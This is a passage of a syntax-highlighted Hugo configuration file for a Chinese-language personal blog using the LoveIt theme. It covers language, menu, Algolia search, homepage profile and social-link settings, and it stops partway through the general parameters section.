<pre tabindex="0" class="chroma"><code class="language-toml" data-lang="toml"><span class="line"><span class="cl"><span class="nx">baseURL</span> <span class="p">=</span> <span class="s2">&#34;https://cnitlrt.github.io&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c"># [en, zh-cn, fr, pl, ...] determines default content language</span>
</span></span><span class="line"><span class="cl"><span class="c"># [en, zh-cn, fr, pl, ...] 设置默认的语言</span>
</span></span><span class="line"><span class="cl"><span class="nx">defaultContentLanguage</span> <span class="p">=</span> <span class="s2">&#34;zh-cn&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c"># 网站语言, 仅在这里 CN大写</span>
</span></span><span class="line"><span class="cl"><span class="nx">languageCode</span> <span class="p">=</span> <span class="s2">&#34;zh-CN&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c"># 是否包括中日韩文字</span>
</span></span><span class="line"><span class="cl"><span class="nx">hasCJKLanguage</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl"><span class="c"># 主题</span>
</span></span><span class="line"><span class="cl"><span class="nx">theme</span> <span class="p">=</span> <span class="s2">&#34;LoveIt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c"># 网站标题</span>
</span></span><span class="line"><span class="cl"><span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;cnitlrtの博客 - 在阅读中遇见自己&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c"># 是否使用 robots.txt</span>
</span></span><span class="line"><span class="cl"><span class="nx">enableRobotsTXT</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl"><span class="c"># 是否使用 git 信息</span>
</span></span><span class="line"><span class="cl"><span class="nx">enableGitInfo</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl"><span class="c"># 是否使用 emoji 代码</span>
</span></span><span class="line"><span class="cl"><span class="nx">enableEmoji</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">languages</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nx">weight</span> <span class="p">=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 网站语言, 仅在这里 CN 大写</span>
</span></span><span class="line"><span class="cl">    <span class="nx">languageCode</span> <span class="p">=</span> <span class="s2">&#34;zh-CN&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 语言名称</span>
</span></span><span class="line"><span class="cl">    <span class="nx">languageName</span> <span class="p">=</span> <span class="s2">&#34;简体中文&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 是否包括中日韩文字</span>
</span></span><span class="line"><span class="cl">    <span class="nx">hasCJKLanguage</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 默认每页列表显示的文章数目</span>
</span></span><span class="line"><span class="cl">    <span class="nx">paginate</span> <span class="p">=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">    <span class="c"># [UA-XXXXXXXX-X] 谷歌分析代号</span>
</span></span><span class="line"><span class="cl">    <span class="nx">googleAnalytics</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 版权描述，仅仅用于 SEO</span>
</span></span><span class="line"><span class="cl">    <span class="nx">copyright</span> <span class="p">=</span> <span class="s2">&#34;This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c"># 菜单配置</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">[[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">.</span><span class="nx">main</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">identifier</span> <span class="p">=</span> <span class="s2">&#34;posts&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 你可以在名称 (允许 HTML 格式) 之前添加其他信息, 例如图标</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 你可以在名称 (允许 HTML 格式) 之后添加其他信息, 例如图标</span>
</span></span><span class="line"><span class="cl">        <span class="nx">post</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;所有文章&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="p">=</span> <span class="s2">&#34;/posts/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">weight</span> <span class="p">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">      <span class="p">[[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">.</span><span class="nx">main</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">identifier</span> <span class="p">=</span> <span class="s2">&#34;tags&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">post</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;标签&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="p">=</span> <span class="s2">&#34;/tags/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">weight</span> <span class="p">=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">      <span class="p">[[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">.</span><span class="nx">main</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">identifier</span> <span class="p">=</span> <span class="s2">&#34;categories&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">post</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;分类&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="p">=</span> <span class="s2">&#34;/categories/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">weight</span> <span class="p">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">      <span class="p">[[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">.</span><span class="nx">main</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">identifier</span> <span class="p">=</span> <span class="s2">&#34;documentation&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;文档&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="p">=</span> <span class="s2">&#34;/categories/documentation/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">weight</span> <span class="p">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl">      <span class="p">[[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">.</span><span class="nx">main</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">identifier</span> <span class="p">=</span> <span class="s2">&#34;about&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">post</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;关于&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="p">=</span> <span class="s2">&#34;/about/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">weight</span> <span class="p">=</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">      <span class="p">[[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">.</span><span class="nx">main</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">identifier</span> <span class="p">=</span> <span class="s2">&#34;github&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&lt;i class=&#39;fab fa-github fa-fw&#39;&gt;&lt;/i&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">post</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;Github&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="p">=</span> <span class="s2">&#34;https://github.com/cnitlrt&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;GitHub&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">weight</span> <span class="p">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">      <span class="p">[[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">menu</span><span class="p">.</span><span class="nx">main</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">identifier</span> <span class="p">=</span> <span class="s2">&#34;friend&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">pre</span> <span class="p">=</span> <span class="s2">&#34;&lt;i class=&#39;fas fa-user-friends&#39;&gt;&lt;/i&gt;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">post</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span> <span class="p">=</span> <span class="s2">&#34;友链&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="p">=</span> <span class="s2">&#34;/friend/&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">weight</span> <span class="p">=</span> <span class="mi">7</span>      
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 网站描述</span>
</span></span><span class="line"><span class="cl">      <span class="nx">description</span> <span class="p">=</span> <span class="s2">&#34;cnitlrtの博客&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 网站关键词</span>
</span></span><span class="line"><span class="cl">      <span class="nx">keywords</span> <span class="p">=</span> <span class="p">[</span><span class="s2">&#34;Theme&#34;</span><span class="p">,</span> <span class="s2">&#34;Hugo&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 应用图标配置</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">app</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 当添加到 iOS 主屏幕或者 Android 启动器时的标题, 覆盖默认标题</span>
</span></span><span class="line"><span class="cl">        <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;LoveIt&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 是否隐藏网站图标资源链接</span>
</span></span><span class="line"><span class="cl">        <span class="nx">noFavicon</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 更现代的 SVG 网站图标, 可替代旧的 .png 和 .ico 文件</span>
</span></span><span class="line"><span class="cl">        <span class="nx">svgFavicon</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Android 浏览器主题色</span>
</span></span><span class="line"><span class="cl">        <span class="nx">themeColor</span> <span class="p">=</span> <span class="s2">&#34;#ffffff&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Safari 图标颜色</span>
</span></span><span class="line"><span class="cl">        <span class="nx">iconColor</span> <span class="p">=</span> <span class="s2">&#34;#5bbad5&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Windows v8-10 磁贴颜色</span>
</span></span><span class="line"><span class="cl">        <span class="nx">tileColor</span> <span class="p">=</span> <span class="s2">&#34;#da532c&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 搜索配置</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">search</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 搜索引擎的类型 (&#34;lunr&#34;, &#34;algolia&#34;)</span>
</span></span><span class="line"><span class="cl">        <span class="nx">type</span> <span class="p">=</span> <span class="s2">&#34;algolia&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 文章内容最长索引长度</span>
</span></span><span class="line"><span class="cl">        <span class="nx">contentLength</span> <span class="p">=</span> <span class="mi">4000</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 搜索框的占位提示语</span>
</span></span><span class="line"><span class="cl">        <span class="nx">placeholder</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 最大结果数目</span>
</span></span><span class="line"><span class="cl">        <span class="nx">maxResultLength</span> <span class="p">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 结果内容片段长度</span>
</span></span><span class="line"><span class="cl">        <span class="nx">snippetLength</span> <span class="p">=</span> <span class="mi">50</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 搜索结果中高亮部分的 HTML 标签</span>
</span></span><span class="line"><span class="cl">        <span class="nx">highlightTag</span> <span class="p">=</span> <span class="s2">&#34;em&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 是否在搜索索引中使用基于 baseURL 的绝对路径</span>
</span></span><span class="line"><span class="cl">        <span class="nx">absoluteURL</span> <span class="p">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">algolia</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">          <span class="nx">index</span> <span class="p">=</span> <span class="s2">&#34;index.zh-cn&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="nx">appID</span> <span class="p">=</span> <span class="s2">&#34;PASDMWALPK&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="nx">searchKey</span> <span class="p">=</span> <span class="s2">&#34;b42948e51daaa93df92381c8e2ac0f93&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 主页信息设置</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">home</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c"># RSS 文章数目</span>
</span></span><span class="line"><span class="cl">        <span class="nx">rss</span> <span class="p">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 主页个人信息</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">home</span><span class="p">.</span><span class="nx">profile</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">          <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">          <span class="c"># Gravatar 邮箱，用于优先在主页显示的头像</span>
</span></span><span class="line"><span class="cl">          <span class="nx">gravatarEmail</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="c"># 主页显示头像的 URL</span>
</span></span><span class="line"><span class="cl">          <span class="nx">avatarURL</span> <span class="p">=</span> <span class="s2">&#34;/images/avatar.jpg&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="c"># 主页显示的网站标题 (支持 HTML 格式)</span>
</span></span><span class="line"><span class="cl">          <span class="nx">title</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="c"># 主页显示的网站副标题</span>
</span></span><span class="line"><span class="cl">          <span class="nx">subtitle</span> <span class="p">=</span> <span class="s2">&#34;No Pwn No Fun&#34;</span>
</span></span><span class="line"><span class="cl">          <span class="c"># 是否为副标题显示打字机动画</span>
</span></span><span class="line"><span class="cl">          <span class="nx">typeit</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">          <span class="c"># 是否显示社交账号</span>
</span></span><span class="line"><span class="cl">          <span class="nx">social</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">          <span class="c"># 免责声明 (支持 HTML 格式)</span>
</span></span><span class="line"><span class="cl">          <span class="nx">disclaimer</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># 主页文章列表</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">home</span><span class="p">.</span><span class="nx">posts</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">          <span class="nx">enable</span> <span class="p">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">          <span class="c"># 主页每页显示文章数量</span>
</span></span><span class="line"><span class="cl">          <span class="nx">paginate</span> <span class="p">=</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">      <span class="c"># 主页的社交信息设置</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="nx">languages</span><span class="p">.</span><span class="nx">zh-cn</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">social</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="nx">GitHub</span> <span class="p">=</span> <span class="s2">&#34;cnitlrt&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c">#Bilibili = &#34;480883651&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c">#Zhihu = &#34;yimi-yang-guang-96-65&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Linkedin</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Twitter</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Instagram</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Facebook</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Telegram</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Medium</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Gitlab</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Youtubelegacy</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Youtubecustom</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Youtubechannel</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Tumblr</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Quora</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Keybase</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Pinterest</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Reddit</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Codepen</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">FreeCodeCamp</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Bitbucket</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Stackoverflow</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Weibo = &#34;xxxx&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Odnoklassniki</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">VK</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Flickr</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Xing</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Snapchat</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Soundcloud</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Spotify</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Bandcamp</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Paypal</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Fivehundredpx</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Mix</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Goodreads</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Lastfm</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Foursquare</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Hackernews</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Kickstarter</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Patreon</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Steam = &#34;xxxx&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Twitch</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Strava</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Skype</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Whatsapp</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Juejin =&#34;user/3843548384077192&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># Douban = &#34;xxxx&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Angellist</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Slidershare</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Jsfiddle</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Deviantart</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Behance</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Dribbble</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Wordpress</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Vine</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Googlescholar</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Researchgate</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Mastodon</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Thingiverse</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Devto</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Gitea</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">XMPP</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Matrix</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">        <span class="nx">Email</span> <span class="p">=</span> <span class="s2">&#34;1258175307@qq.com&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c"># RSS = true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">params</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="c"># LoveIt theme version</span>
</span></span><span class="line"><span class="cl">  <span class="c"># LoveIt 主题版本</span>
</span></span><span class="line"><span class="cl">  <span class="nx">version</span> <span class="p">=</span> <span class="s2">&#34;0.2.X&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="c"># site default theme (&#34;light&#34;, &#34;dark&#34;, &#34;auto&#34;)</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 网站默认主题 (&#34;light&#34;, &#34;dark&#34;, &#34;auto&#34;)</span>
</span></span><span class="line"><span class="cl">  <span class="nx">defaultTheme</span> <span class="p">=</span> <span class="s2">&#34;auto&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="c"># public git repo url only then enableGitInfo is true</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 公共 git 仓库路径，仅在 enableGitInfo 设为 true 时有效</span>
</span></span><span class="line"><span class="cl">  <span class="nx">gitRepo</span> <span class="p">=</span> <span class="s2">&#34;https://github.com/dillonzq/LoveIt&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="c"># which hash function used for SRI, when empty, no SRI is used (&#34;sha256&#34;, &#34;sha384&#34;, &#34;sha512&#34;, &#34;md5&#34;)</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 哪种哈希函数用来 SRI, 为空时表示不使用 SRI (&#34;sha256&#34;, &#34;sha384&#34;, &#34;sha512&#34;, &#34;md5&#34;)</span>
</span></span><span class="line"><span class="cl">  <span class="nx">fingerprint</span> <span class="p">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="c"># date format</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 日期格式</span>
</span></span><span class="line"><span class="cl">  <span class="nx">dateFormat</span> <span class="p">=</span> <span class="s2">&#34;2006-01-02&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="c"># website images for Open Graph and Twitter Cards</span>
</span></span><span class="line"><span class="cl">  <span class="c"># 网站图片, 用于 Open Graph 和 Twitter Cards</span>
